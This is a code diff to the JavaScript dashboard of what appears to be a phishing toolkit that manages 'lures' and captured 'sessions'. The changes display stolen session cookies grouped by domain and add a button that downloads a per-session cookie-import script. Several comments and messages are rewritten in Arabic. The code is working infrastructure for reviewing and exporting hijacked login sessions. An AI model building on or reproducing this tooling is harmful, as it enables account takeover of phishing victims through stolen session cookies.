@@ -545,7 +545,7 @@ async function deleteLure(id) {
     }
 }
 
-// Fetch Session details
+// Populate Session details
 async function fetchSessionDetails(id) {
     try {
         const response = await fetch(`${API_BASE_URL}/sessions/${id}`, {
@@ -969,32 +969,40 @@ async function showSessionDetails(id) {
         const cookiesTable = document.getElementById('cookies-table').querySelector('tbody');
         cookiesTable.innerHTML = '';
         
-        // Check for presence of cookies
-        if (sessionData.tokens && Object.keys(sessionData.tokens).length > 0) {
-            // Convert cookies to displayable format
-            let hasAnyCookies = false;
-            
-            for (const domain in sessionData.tokens) {
-                const domainCookies = sessionData.tokens[domain];
+        // الكشف عن الكوكيز وتنسيقها للعرض
+        let hasAnyCookies = false;
+        
+        // التحقق من وجود الكوكيز في أي من الحقول المحتملة
+        const cookieTokens = sessionData.cookie_tokens || sessionData.CookieTokens || sessionData.tokens || {};
+
+        if (cookieTokens && Object.keys(cookieTokens).length > 0) {
+            for (const domain in cookieTokens) {
+                const domainCookies = cookieTokens[domain];
                 
                 for (const cookieName in domainCookies) {
                     hasAnyCookies = true;
                     const cookie = domainCookies[cookieName];
                     
+                    // التحقق من نوع البيانات وتنسيقها بشكل صحيح
+                    let cookieValue = '';
+                    if (typeof cookie === 'string') {
+                        cookieValue = cookie;
+                    } else if (cookie && typeof cookie === 'object') {
+                        cookieValue = cookie.value || cookie.Value || JSON.stringify(cookie);
+                    }
+                    
                     const row = document.createElement('tr');
                     row.innerHTML = `
                         <td>${domain}</td>
                         <td>${cookieName}</td>
-                        <td>${cookie.value || cookie.Value || ''}</td>
+                        <td>${cookieValue}</td>
                     `;
                     cookiesTable.appendChild(row);
                 }
             }
-            
-            if (!hasAnyCookies) {
-                cookiesTable.innerHTML = '<tr><td colspan="3" class="text-center">No cookies available</td></tr>';
-            }
-        } else {
+        }
+        
+        if (!hasAnyCookies) {
             cookiesTable.innerHTML = '<tr><td colspan="3" class="text-center">No cookies available</td></tr>';
         }
         
@@ -1016,6 +1024,11 @@ async function showSessionDetails(id) {
         } else {
             paramsTable.innerHTML = '<tr><td colspan="2" class="text-center">No parameters available</td></tr>';
         }
+        
+        // تحديث زر تنزيل الكوكيز
+        const downloadCookiesBtn = document.getElementById('download-cookies-btn');
+        downloadCookiesBtn.dataset.sessionId = id;
+        downloadCookiesBtn.style.display = hasAnyCookies ? 'inline-flex' : 'none';
         
         // Handle session delete event
         document.getElementById('session-delete-btn').onclick = async function() {
@@ -1341,25 +1354,54 @@ function setupEventListeners() {
         });
     });
 
-    // Add event listener for download cookies button
-    document.addEventListener('click', function(e) {
-        if (e.target && e.target.id === 'download-cookies-btn') {
-            downloadCookiesScript();
-        }
+    // مستمع لزر تنزيل الكوكيز
+    document.getElementById('download-cookies-btn').addEventListener('click', function() {
+        downloadCookiesScript();
+    });
+    
+    // مستمعات الأحداث لعلامات تبويب نافذة تفاصيل الجلسة
+    const tabItems = document.querySelectorAll('.tab-item');
+    tabItems.forEach(item => {
+        item.addEventListener('click', function() {
+            // إزالة التنشيط من جميع علامات التبويب
+            document.querySelectorAll('.tab-item').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // إضافة التنشيط للعلامة المحددة
+            this.classList.add('active');
+            
+            // إخفاء جميع المحتويات
+            document.querySelectorAll('.tab-pane').forEach(pane => {
+                pane.classList.remove('active');
+            });
+            
+            // إظهار المحتوى المرتبط بعلامة التبويب المحددة
+            const targetTabId = this.getAttribute('data-tab');
+            document.getElementById(targetTabId).classList.add('active');
+        });
+    });
+    
+    // إغلاق نافذة تفاصيل الجلسة
+    document.querySelectorAll('.modal-cancel, .modal .close').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.getElementById('session-view-modal').style.display = 'none';
+        });
     });
 }
 
 // Add download cookies script
 function downloadCookiesScript() {
-    const sessionIdElement = document.getElementById('session-id-value');
-    if (!sessionIdElement || !sessionIdElement.textContent) {
-        showToast('Error', 'Session ID not found', 'error');
+    // الحصول على معرف الجلسة من زر التنزيل بدلاً من العنصر النصي
+    const downloadBtn = document.getElementById('download-cookies-btn');
+    const sessionId = downloadBtn.dataset.sessionId;
+    
+    if (!sessionId) {
+        showToast('خطأ', 'لم يتم العثور على معرف الجلسة', 'error');
         return;
     }
     
-    const sessionId = sessionIdElement.textContent;
-    
-    // Create download link
+    // إنشاء رابط التنزيل
     const downloadUrl = `/api/sessions/${sessionId}/cookies-script`;
     
     // Create a dummy anchor element for download
@@ -1368,12 +1410,18 @@ function downloadCookiesScript() {
     downloadLink.target = '_blank';
     downloadLink.download = `cookies_${sessionId}.js`;
     
-    // Append the link to the document and trigger the download
+    // محاولة التنزيل والإبلاغ عن الحالة
+    showToast('جاري المعالجة', 'جاري تنزيل سكريبت الكوكيز...', 'info');
+    
+    // تسجيل بيانات التنزيل للتصحيح
+    console.log('تنزيل الكوكيز:', downloadUrl);
+    
+    // إضافة الرابط إلى المستند وتنفيذ النقر
     document.body.appendChild(downloadLink);
     downloadLink.click();
     
-    // Remove the link from the document
+    // إزالة الرابط من المستند
     document.body.removeChild(downloadLink);
     
-    showToast('Success', 'Cookies script download started', 'success');
+    showToast('نجاح', 'تم بدء تنزيل سكريبت الكوكيز', 'success');
 } 
